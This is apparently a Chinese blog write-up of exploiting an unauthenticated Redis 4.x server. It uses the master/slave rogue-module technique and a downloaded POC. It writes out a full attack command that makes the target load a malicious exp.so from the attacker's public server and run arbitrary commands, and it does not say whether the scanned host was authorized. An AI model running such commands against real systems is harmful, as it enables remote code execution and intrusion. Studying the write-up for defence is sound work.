# 记一次 Redis 未授权访问漏洞利用

> 阅读本文大概需要 0.8 分钟

今天扫描主机时，扫描到一台主机开放了 6379 端口，该端口为 Redis 服务所使用的的端口。

首先尝试是否存在未授权访问。

使用 redis-cli 进行连接，成功连接，存在未授权访问漏洞。

输入 info 查看当前 Redis 版本，为 4.x 版本。

![](../Images/80c77c6e7ae886641348459423548bb2.png)

4.x/5.0.5 前版本的 Redis 存在任意命令执行漏洞。

可以使用 master/slave 模式加载远程模块，通过动态链接库的方式执行任意命令。

gitee 上找到一个对应的 POC。

![](../Images/c5943b9bd10900561669f6ec1a775cf4.png)

下载源码。

![](../Images/107ce5b2337d5ad64e8725373ac08801.png)

按照提示进行编译。

![](../Images/3116573867f9874eff4a52af47d13b2d.png)

编译成功，得到 exp.so。

![](../Images/c6e24b9cd340ff05ad1d8ac7eab2e5a8.png)

接下来开始攻击，这一步需要用到公网 ip。因为是利用 Redis 主从模式，需要目标机器也能访问到我们的机器。

这里我使用我的服务器进行接下来的渗透。

回到 redis-rogue-getshell 文件夹，执行以下命令开始攻击。

```
python3 redis-master.py -r 目标机器ip -p 6379 -L 你的公网地址 -P 8888 -f RedisModulesSDK/exp.so -c "id"

```

最后的 `id` 就是实际要在目标机器执行的命令。

![](../Images/49f1f24339e6a4c4e3f52233c6f52e57.png)

命令成功执行，可以看到红框位置打印出了当前用户信息。

至此，Redis 未授权访问漏洞利用成功。
